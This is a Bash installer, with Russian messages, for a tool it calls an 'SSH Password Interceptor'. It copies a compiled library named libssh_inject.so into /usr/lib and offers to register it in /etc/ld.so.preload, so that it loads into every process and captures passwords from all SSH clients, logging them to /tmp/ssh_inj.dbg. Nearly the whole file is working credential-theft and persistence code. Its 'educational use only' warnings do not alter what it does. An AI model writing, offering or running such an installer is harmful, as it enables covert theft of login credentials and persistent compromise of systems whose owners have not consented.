#!/bin/bash

# SSH Password Interceptor - Установщик
# Версия 1.1.0

echo "====================================="
echo "   SSH Password Interceptor v1.1.0"
echo "           Установка"
echo "====================================="
echo ""

# Проверка привилегий root
if [ "$(id -u)" != "0" ]; then
    echo "Ошибка: для установки требуются привилегии администратора."
    echo "Запустите скрипт с sudo: sudo ./installer.sh"
    exit 1
fi

# Проверка операционной системы
OS=$(uname -s)
if [ "$OS" != "Linux" ]; then
    echo "Ошибка: этот установщик поддерживается только для Linux."
    exit 1
fi

# Предупреждение об использовании
echo "ПРЕДУПРЕЖДЕНИЕ: Этот инструмент предназначен ТОЛЬКО для образовательных целей."
echo "Использование этого инструмента для несанкционированного доступа к системам"
echo "является незаконным и неэтичным."
echo ""
read -p "Нажмите Enter, чтобы продолжить..."
echo ""

# Проверка наличия скомпилированной библиотеки
LIB_NAME="libssh_inject.so"
if [ ! -f "$LIB_NAME" ]; then
    echo "Ошибка: библиотека $LIB_NAME не найдена в текущей директории."
    echo "Убедитесь, что библиотека была успешно скомпилирована."
    exit 1
fi

# Установка библиотеки
echo "Установка библиотеки $LIB_NAME в /usr/lib..."
cp "$LIB_NAME" /usr/lib/
chmod 755 "/usr/lib/$LIB_NAME"

# Проверка успешной установки
if [ ! -f "/usr/lib/$LIB_NAME" ]; then
    echo "Ошибка: не удалось установить библиотеку в /usr/lib/$LIB_NAME."
    exit 1
fi

echo "Библиотека успешно установлена в /usr/lib/$LIB_NAME."
echo ""

# Настройка автоматической загрузки
echo "Хотите настроить систему для автоматической загрузки библиотеки?"
echo "Это позволит перехватывать пароли от всех SSH-клиентов."
read -p "Настроить автозагрузку? (y/n): " configure_autoload

if [ "$configure_autoload" = "y" ] || [ "$configure_autoload" = "Y" ]; then
    # Проверка существования файла /etc/ld.so.preload
    if [ -f "/etc/ld.so.preload" ]; then
        echo "Файл /etc/ld.so.preload уже существует."
        
        # Создаем резервную копию
        cp /etc/ld.so.preload /etc/ld.so.preload.installer.bak
        echo "Создана резервная копия: /etc/ld.so.preload.installer.bak"
        
        # Проверяем, содержит ли файл уже ссылку на нашу библиотеку
        if grep -q "/usr/lib/$LIB_NAME" /etc/ld.so.preload; then
            echo "Библиотека уже настроена для автозагрузки."
        else
            # Добавляем нашу библиотеку в файл
            echo "/usr/lib/$LIB_NAME" >> /etc/ld.so.preload
            echo "Библиотека добавлена в /etc/ld.so.preload для автозагрузки."
        fi
    else
        # Создаем файл и добавляем нашу библиотеку
        echo "/usr/lib/$LIB_NAME" > /etc/ld.so.preload
        echo "Создан файл /etc/ld.so.preload и библиотека настроена для автозагрузки."
    fi
    
    echo "Настройка автозагрузки завершена."
else
    echo "Автозагрузка не настроена."
    echo "Для ручной загрузки библиотеки используйте:"
    echo "export LD_PRELOAD=/usr/lib/$LIB_NAME"
fi

echo ""
echo "Установка завершена успешно!"
echo "Перехваченные пароли будут записаны в /tmp/ssh_inj.dbg"
echo ""
echo "ВАЖНО: Используйте этот инструмент только в образовательных целях."
echo "Несанкционированный доступ к чужим системам является незаконным." 